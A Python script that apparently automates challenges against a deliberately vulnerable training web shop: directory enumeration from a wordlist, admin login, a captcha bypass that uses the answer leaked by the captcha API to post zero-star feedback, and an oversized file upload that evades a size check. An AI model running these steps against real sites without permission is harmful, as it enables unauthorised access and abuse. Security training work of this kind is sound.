import requests
import json
import os
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configuration
SITE_URL = os.getenv("SITE_URL")
ADMIN_EMAIL = os.getenv("ADMIN_EMAIL")
ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD")
KEYWORDS_FILE = "liste.txt"
UPLOAD_FILE = "a_uploader.txt"

def read_keywords(file_path):
    """Read keywords from file and return as list."""
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: File {file_path} not found")
        return []
    except Exception as e:
        print(f"Error reading keywords: {str(e)}")
        return []

def check_directories(session, base_url, directories):
    """Check if directories exist on the site."""
    for directory in directories:
        try:
            url = f"{base_url}/{directory}"
            response = session.get(url, timeout=5)
            if response.ok and "Copyright" not in response.text:
                print(f"Found directory: {url}")
        except requests.RequestException as e:
            print(f"Error checking {url}: {str(e)}")

def login_admin(session, base_url, email, password):
    """Attempt to login as admin."""
    try:
        response = session.post(
            f"{base_url}/rest/user/login",
            headers={"Content-Type": "application/json"},
            json={"email": email, "password": password},
            timeout=5
        )
        if response.ok:
            print("Admin login successful")
            return True
        else:
            print(f"Login failed: {response.status_code}")
            return False
    except requests.RequestException as e:
        print(f"Login error: {str(e)}")
        return False

def post_feedback(session, base_url):
    """Post feedback with captcha."""
    try:
        # Get captcha
        captcha_response = session.get(f"{base_url}/rest/captcha", timeout=5)
        if not captcha_response.ok:
            print("Error fetching captcha")
            return False
            
        captcha_data = captcha_response.json()
        captcha_id = captcha_data.get("captchaId")
        captcha_answer = captcha_data.get("answer")

        # Post feedback
        feedback_response = session.post(
            f"{base_url}/api/Feedbacks",
            headers={"Content-Type": "application/json"},
            json={
                "captchaId": captcha_id,
                "captcha": captcha_answer,
                "comment": "lol",
                "rating": 0
            },
            timeout=5
        )
        
        if feedback_response.ok:
            print("Feedback posted successfully (0 stars)")
            return True
        else:
            print(f"Feedback post failed: {feedback_response.status_code}")
            return False
    except (requests.RequestException, json.JSONDecodeError) as e:
        print(f"Feedback error: {str(e)}")
        return False

def upload_file(session, base_url, file_path):
    """Create and upload a large file."""
    try:
        # Create file with 151KB of zeros
        with open(file_path, "wb") as f:
            f.write(b"\0" * (1024 * 151))
        
        # Upload file
        with open(file_path, "rb") as f:
            files = {"file": ("large_file.bin", f, "application/octet-stream")}
            response = session.post(
                f"{base_url}/file-upload",
                files=files,
                timeout=10
            )
            
        if response.ok:
            print("File uploaded successfully")
            return True
        else:
            print(f"File upload failed: {response.status_code}")
            return False
    except (IOError, requests.RequestException) as e:
        print(f"File upload error: {str(e)}")
        return False
    finally:
        # Clean up
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                print(f"Cleaned up temporary file: {file_path}")
            except OSError as e:
                print(f"Error cleaning up file: {str(e)}")

def main():
    """Main function to run the script."""
    # Initialize session
    session = requests.Session()
    
    # Read keywords
    directories = read_keywords(KEYWORDS_FILE)
    if not directories:
        print("No directories to check. Exiting.")
        return

    # Check directories
    print("Checking directories...")
    check_directories(session, SITE_URL, directories)

    # Admin login
    print("\nAttempting admin login...")
    if not login_admin(session, SITE_URL, ADMIN_EMAIL, ADMIN_PASSWORD):
        print("Exiting due to login failure")
        return

    # Post feedback
    print("\nPosting feedback...")
    post_feedback(session, SITE_URL)

    # Upload file
    print("\nUploading file...")
    upload_file(session, SITE_URL, UPLOAD_FILE)

if __name__ == "__main__":
    main()